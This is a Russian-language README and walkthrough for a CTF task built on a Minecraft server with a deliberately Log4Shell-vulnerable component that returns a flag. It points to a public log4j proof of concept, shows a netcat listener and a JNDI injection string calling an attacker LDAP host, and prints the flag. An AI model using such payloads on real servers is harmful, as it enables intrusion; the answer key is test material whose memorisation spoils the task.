# Minecraft-task

### Разработчики: Елисеев Никита, Малахов Егор

### Контакты(telegram): Никита:@angrydish, Егор:@bumbuker

**Суть таска:**

log4shell без RCE :). На выходе вы получаете флаг, а не консоль. Игрокам можно было бы дать и консоль, но их слишком много
на один сервис, а там еще и RCE :). За основу взято пропатченое paper ядро, где логгер не обрабатывает jdni как призыв 
к действию, зато наш самописный сервак обрабатывает, но выдает не RCE а сразу флаг.

### Запуск:
```
docker compose up --build -d && docker compose logs -f
connect in MC client via tasks.ssl.nsib.ru:25565
```

### Writeup

Эксплоиты сюда долго пишутся, но легко гуглятся, надежда на то, что участники умеют гуглить.

Для примера берётся POC: [https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)
Также нужна java8 определенной версии: jdk-8u20-linux-x64.tar.gz (она распакуется в папку jdk1.8.0_20, если скачали нужную версию с офф сайта джавы)
После чего можем запускать poc.py с флагом ```python3 poc.py --userip <ip атакующего>```

При запуске POC на хосте атакующего поднимается http сервер на 8000 порту (можно поменять, смотри флаги poc.py --help),
а также ldap на порту 1389. Дополнительно можно указать порт netcat (по умолчанию 9001).
После этого также запускаем ```nc -lvnp 9001```, в котором ожидаем флаг.
Если POC работает, сервак майна поднят и не падает и вы смогли зайти на сервер 1.15.2, то вставляете строку, которую
генерит poc.py вида ```${jndi:ldap://192.168.0.108:1389/a}``` в чат в майнкрафте и в консоли с netcat получаете флаг. 
Вывод POC также будет подобен выводу реальной работы эксплоита.

![изображение](https://github.com/user-attachments/assets/cecceb1a-af91-4173-b008-3c578218264a)


### Флаг

```
SSL_CTF{up4l_v574v41_v574v4l_up41}
```
